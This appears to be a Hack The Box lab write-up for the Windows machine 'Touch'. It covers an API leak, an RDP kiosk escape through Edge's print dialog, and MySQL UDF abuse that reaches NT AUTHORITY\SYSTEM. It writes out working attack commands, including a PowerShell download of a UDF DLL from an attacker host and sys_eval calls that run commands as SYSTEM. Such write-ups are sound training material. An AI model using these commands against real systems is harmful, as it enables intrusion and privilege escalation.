---
title: Touch HTB Machine Writeup
description: Touch HTB Machine Writeup
date: '2026-10-06'
tags:
  - Hackthebox
  - Writeup
  - Windows
published: true
slug: touch-htb-machine-writeup
category: Windows
platform: Hack The Box
difficulty: Easy
---
# HackTheBox — Touch

## Overview

**Touch** starts by giving us an IP address.

Initial enumeration reveals two interesting services:

- **RDP**
- A **web application on port 8443**

The machine description also gives us information recovered from the previous **Layover** machine:

```text
In the Layover machine, you uncovered a name and a booking confirmation code.
Maybe they'll come in handy here?

Jenny Crawford / KS7X2M
```

So, going into the machine, we already have:

```text
Name: Jenny Crawford
Booking Code: KS7X2M
```

The attack path eventually takes us through:

```text
Web Enumeration
      ↓
API Information Disclosure
      ↓
Kiosk Credentials
      ↓
RDP Access
      ↓
Kiosk Escape
      ↓
Command Prompt
      ↓
MySQL Credentials
      ↓
MySQL UDF Abuse
      ↓
NT AUTHORITY\SYSTEM
```

---

# 1. Initial Enumeration

We begin by scanning the provided IP address with Nmap.

The scan reveals two important services:

```text
RDP
HTTPS / Web Application — Port 8443
```

The web application immediately becomes an interesting target, so let's investigate it first.

---

# 2. Web Application Enumeration

Navigating to:

```text
http://<IP>:8443
```

takes us to a login page.

Searching for known CVEs affecting the application doesn't immediately return anything useful.

Instead of focusing only on the visible application, let's enumerate its API endpoints.

During fuzzing, we discover:

```text
/api/status
```

![API endpoint discovered](/images/writeups/touch-htb-machine-writeup/screenshot-from-2026-10-06-13-05-23.png)

Navigating directly to:

```text
/api/status
```

returns application status information.

![API status response](/images/writeups/touch-htb-machine-writeup/screenshot-from-2026-10-06-13-06-49.png)

The response contains a **serial number**.

This looks potentially useful, especially since we're currently looking for a way to authenticate to the portal.

---

# 3. Logging Into the Portal

Trying the exposed serial number as the password works.

We successfully authenticate to the portal.

Inside, we find two particularly useful things:

1. Credentials for the kiosk machine.
2. Options for turning certain kiosk/scanner functionality on and off.

The credentials are:

```text
Username: KioskUser
Password: K!0sk2026#
```

Since RDP was exposed during our initial enumeration, we can try these credentials there.

---

# 4. RDP Access

Using the newly discovered credentials, we connect over RDP:

```text
KioskUser / K!0sk2026#
```

Authentication succeeds.

However, this isn't a normal Windows desktop.

We're placed into a heavily restricted **kiosk environment**.

There is no obvious:

```text
Desktop
Start Menu
Command Prompt
PowerShell
File Explorer
```

We can essentially only interact with the application currently displayed on screen.

So our next objective is clear:

> Escape the kiosk environment and gain access to the underlying Windows operating system.

---

# 5. Triggering the Scanner Error

The kiosk application contains functionality that uses the passenger information given to us in the machine description:

```text
Jenny Crawford
KS7X2M
```

After experimenting with the portal controls and kiosk functionality, I disabled the scanner from the web portal.

Then I attempted to perform a scan from the RDP session.

Because the scanner was now unavailable, the application generated a Windows error.

This error contained a clickable link.

Clicking the link caused **Microsoft Edge** to open.

This gives us access to an application outside the intended kiosk interface.

Now we need to turn that access into something more useful.

---

# 6. Escaping the Kiosk Through the Print Dialog

With Microsoft Edge open, I pressed:

```text
CTRL + P
```

to open the Windows print dialog.

One of the available options is:

```text
Save as PDF
```

Selecting it opens a file dialog asking where the PDF should be saved.

This is useful because Windows file dialogs can sometimes be abused in restricted environments to access programs that the kiosk normally prevents us from launching.

Instead of entering a normal filename, I entered:

```text
C:\Windows\System32\cmd.exe
```

Opening it launches:

```text
cmd.exe
```

We have successfully escaped the kiosk.

---

# 7. Getting the User Flag

Now that we have Command Prompt access, we can navigate to the current user's Desktop.

```cmd
cd %userprofile%\Desktop
dir
```

Among the files, we find:

```text
user.txt
```

We can read it with:

```cmd
type user.txt
```

This gives us the **user flag**.

---

# 8. Privilege Escalation Enumeration

Now we need to move from `KioskUser` to an administrative context.

Since we have access to the Windows filesystem, we can start looking for scripts, configuration files, credentials, scheduled-task helpers, and other interesting files.

One useful place to investigate is:

```text
C:\ProgramData
```

We can search for batch scripts with:

```cmd
dir "C:\ProgramData\*.bat"
```

During enumeration, we discover:

```text
C:\ProgramData\HTB Airways\refresh-dates.bat
```

Let's read it:

```cmd
type "C:\ProgramData\HTB Airways\refresh-dates.bat"
```

The script contains credentials for the local MySQL server.

The password is:

```text
HTB@irw4ys_DB!2026
```

and the database account is:

```text
root
```

So we can connect with:

```cmd
mysql -u root -p"HTB@irw4ys_DB!2026"
```

Authentication succeeds.

---

# 9. Enumerating MySQL Privileges

Before trying to exploit anything, let's determine exactly what our database account can do.

Inside MySQL:

```sql
SHOW GRANTS;
```

The account has extensive privileges:

```text
GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP,
RELOAD, SHUTDOWN, PROCESS, FILE, REFERENCES, INDEX,
ALTER, SHOW DATABASES, SUPER, CREATE TEMPORARY TABLES,
LOCK TABLES, EXECUTE, REPLICATION SLAVE,
REPLICATION CLIENT, CREATE VIEW, SHOW VIEW,
CREATE ROUTINE, ALTER ROUTINE, CREATE USER,
EVENT, TRIGGER, CREATE TABLESPACE,
CREATE ROLE, DROP ROLE
ON *.* TO `root`@`localhost`
WITH GRANT OPTION
```

This is effectively a highly privileged MySQL account.

Next, let's determine where MySQL loads plugins from:

```sql
SHOW VARIABLES LIKE 'plugin_dir';
```

The result is:

```text
C:\MySQL\lib\plugin\
```

This gives us an interesting privilege-escalation vector:

> **MySQL User Defined Function (UDF) abuse**

If we can place a malicious UDF DLL into MySQL's plugin directory and register it as a function, commands invoked through that function will execute under the security context of the MySQL service.

If MySQL is running as `SYSTEM`, that means command execution as:

```text
NT AUTHORITY\SYSTEM
```

---

# 10. Preparing the MySQL UDF

For this technique, we use:

```text
lib_mysqludf_sys_64.dll
```

On our attacking machine, we download it:

```bash
wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/mysql/lib_mysqludf_sys_64.dll
```

Next, we need to transfer the DLL to the Windows machine.

For example, we can host the file from our attacking machine:

```bash
python3 -m http.server 8000
```

Then, from the target, download it directly into MySQL's plugin directory:

```powershell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.167:8000/lib_mysqludf_sys_64.dll','C:\MySQL\lib\plugin\lib_mysqludf_sys.dll')"
```

The DLL should now exist at:

```text
C:\MySQL\lib\plugin\lib_mysqludf_sys.dll
```

---

# 11. Creating the UDF

Now we return to MySQL.

First, select the `mysql` database:

```sql
USE mysql;
```

Then register the DLL as a User Defined Function:

```sql
CREATE FUNCTION sys_eval
RETURNS STRING
SONAME 'lib_mysqludf_sys.dll';
```

This creates:

```text
sys_eval()
```

which can execute operating-system commands and return their output.

Let's test it:

```sql
SELECT sys_eval('whoami');
```

The result initially appears as:

```text
0x6E7420617574686F726974795C73797374656D
```

This is hexadecimal.

Decoding it gives:

```text
nt authority\system
```

![MySQL UDF SYSTEM execution](/images/writeups/touch-htb-machine-writeup/screenshot-from-2026-10-06-04-18-22.png)

This confirms that commands executed through our MySQL UDF run as:

```text
NT AUTHORITY\SYSTEM
```

We now effectively have SYSTEM-level command execution.

---

# 12. Disabling MySQL Hex Output

Instead of manually decoding hexadecimal results every time, we can reconnect to MySQL with:

```cmd
mysql --binary-as-hex=0 -u root -p"HTB@irw4ys_DB!2026"
```

This tells the MySQL client not to automatically display binary values as hexadecimal.

Now commands executed through:

```sql
sys_eval()
```

are much easier to read.

---

# 13. Reading the Root Flag

Since `sys_eval()` executes commands as:

```text
NT AUTHORITY\SYSTEM
```

we can use it to access the Administrator's Desktop.

The root flag is located at:

```text
C:\Users\Administrator\Desktop\root.txt
```

We can read it directly through MySQL:

```sql
SELECT sys_eval(
    'cmd /c type "C:\\Users\\Administrator\\Desktop\\root.txt"'
);
```

The command executes as SYSTEM and returns the contents of:

```text
root.txt
```

We now have the **root flag**.

Machine complete. 🚩

---

# Attack Chain

The complete attack path for **Touch** was:

```text
Initial IP
    │
    ▼
Nmap Enumeration
    │
    ├──────────────► RDP
    │
    ▼
Web Application :8443
    │
    ▼
API Enumeration
    │
    ▼
/api/status
    │
    ▼
Serial Number Disclosure
    │
    ▼
Portal Authentication
    │
    ▼
Kiosk Credentials
    │
    ▼
RDP as KioskUser
    │
    ▼
Restricted Kiosk Session
    │
    ▼
Disable Scanner
    │
    ▼
Trigger Windows Error
    │
    ▼
Open Microsoft Edge
    │
    ▼
CTRL + P
    │
    ▼
Save as PDF
    │
    ▼
File Dialog
    │
    ▼
C:\Windows\System32\cmd.exe
    │
    ▼
Kiosk Escape / CMD Access
    │
    ▼
User Flag
    │
    ▼
Enumerate C:\ProgramData
    │
    ▼
refresh-dates.bat
    │
    ▼
MySQL Root Credentials
    │
    ▼
MySQL Enumeration
    │
    ├── Highly Privileged root Account
    │
    └── Writable/Usable Plugin Directory
    │
    ▼
lib_mysqludf_sys.dll
    │
    ▼
CREATE FUNCTION sys_eval()
    │
    ▼
OS Command Execution
    │
    ▼
NT AUTHORITY\SYSTEM
    │
    ▼
Administrator\Desktop\root.txt
    │
    ▼
ROOT FLAG 🚩
```

---

# Key Takeaways

## API Endpoints Can Expose More Than the Main Application

The visible login page didn't immediately give us a path forward.

Fuzzing revealed:

```text
/api/status
```

which leaked a serial number that could be reused for authentication.

This is a good reminder not to limit web enumeration to visible pages.

---

## Small Information Leaks Can Become Authentication Bypasses

The serial number initially looked like ordinary device information.

In practice, it doubled as a password.

Information returned by diagnostic and status endpoints should therefore be treated as potentially sensitive.

---

## Kiosk Mode Is Not a Security Boundary by Itself

The RDP session appeared heavily restricted because we couldn't directly access:

```text
cmd.exe
PowerShell
File Explorer
Desktop
```

But the kiosk application still exposed paths into normal Windows functionality.

The chain was:

```text
Scanner Error
     ↓
Clickable Link
     ↓
Microsoft Edge
     ↓
Print Dialog
     ↓
Save as PDF
     ↓
File Dialog
     ↓
cmd.exe
```

A locked-down interface is only effective when every reachable application and dialog respects the same restrictions.

---

## Credentials Inside Scripts Are High-Value Targets

The batch file:

```text
C:\ProgramData\HTB Airways\refresh-dates.bat
```

contained plaintext MySQL credentials.

Those credentials gave us access to a highly privileged database account and ultimately provided the privilege-escalation path.

Configuration files and automation scripts should always be checked during local enumeration.

---

## Database Privileges Can Become Operating-System Privileges

Having MySQL `root` access does not automatically mean Windows `SYSTEM`.

The important discovery was the combination of:

```text
Privileged MySQL Account
        +
Plugin Directory Access
        +
UDF Loading
        +
MySQL Running as SYSTEM
```

By registering `lib_mysqludf_sys.dll`, we turned database-level control into operating-system command execution.

Running:

```sql
SELECT sys_eval('whoami');
```

confirmed the resulting execution context:

```text
nt authority\system
```

At that point, the database had effectively become our privilege-escalation mechanism.

---

# Conclusion

**Touch** is a good example of chaining information disclosure, kiosk escape techniques, credential discovery, and database functionality into a complete compromise.

We started with nothing more than an IP address and information recovered from **Layover**:

```text
Jenny Crawford
KS7X2M
```

From there, the path became:

```text
API Information Disclosure
        ↓
Portal Access
        ↓
RDP Credentials
        ↓
Kiosk Escape
        ↓
Command Prompt
        ↓
MySQL Credentials
        ↓
MySQL UDF
        ↓
NT AUTHORITY\SYSTEM
```

The most interesting part of the machine was the transition between attack surfaces. The web application provided access to the kiosk, the kiosk escape exposed the underlying Windows system, local enumeration exposed MySQL credentials, and MySQL finally provided SYSTEM-level command execution.

**Initial access:** `KioskUser`  
**Database access:** `root@localhost`  
**Final execution context:** `NT AUTHORITY\SYSTEM`

Machine complete. 🚩
